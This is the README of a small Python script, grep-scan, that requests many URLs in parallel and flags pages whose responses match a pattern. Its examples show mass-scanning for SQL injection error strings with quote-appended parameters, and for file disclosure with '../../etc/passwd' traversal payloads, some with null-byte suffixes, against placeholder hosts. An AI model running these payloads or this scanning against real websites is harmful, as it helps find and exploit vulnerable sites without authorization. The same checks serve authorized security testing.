# Grep Scan

Grep-Scan is a simple python script to match results in web requests

Requirements
-
- Python 2.7
- Requests

Install
-

```
pip install requests
git clone https://github.com/proclnas/grep-scan.git
cd grep-scan
python grep-scan.py --help
```

Usage
-
You can pass a single string or regexp to the -p/--pattern param to get pages with the correspondent
pattern.

The main pivot of the grep scan is the re.search, so you can mount your expression based on it.
See the [full documentation](https://docs.python.org/2/library/re.html#re.search) to more details:



## Single string
#### Get all pages with bar in the body response:
```
python -f uris.txt -p "bar" -t 20 -o pages-with-bar-word.txt 
```

## RegExp
#### Get all possible sites vulnerable to sqli

```
$ head uris.txt
http://site-fake.com/page.php?id=10'
http://site-fake.com/article.php?id=30'
http://site-fake.com/about.php?id=764'
```
Scan:
```
python -f uris.txt -p "/Mysql_|SQL|mysql_num_rows()|mysql_fetch_assoc()/" -t 50 -o sqli.txt
```

Output:
```
[+][Pattern found] http://site-fake.com/article.php?id=30'
```

#### Get all possible sites vulnerable to lfi/lfd/rfi/etc
```
$ head uris.txt
http://site-fake.com/download.php?file=../../../../../../../../etc/passwd
http://site-fake.com/file.php?download=../../../../../../../../etc/passwd%00
http://site-fake.com/pdf.php?get=../../../../../../../../etc/passwd%00
```
Scan:
```
python -f uris.txt -p "root:" -t 50 -o file-disclousure.txt
```

Output:
```
[+][Pattern found] http://site-fake.com/file.php?download=../../../../../../../../etc/passwd%00
```

## Contribute
Feel free to fork and send a pr.
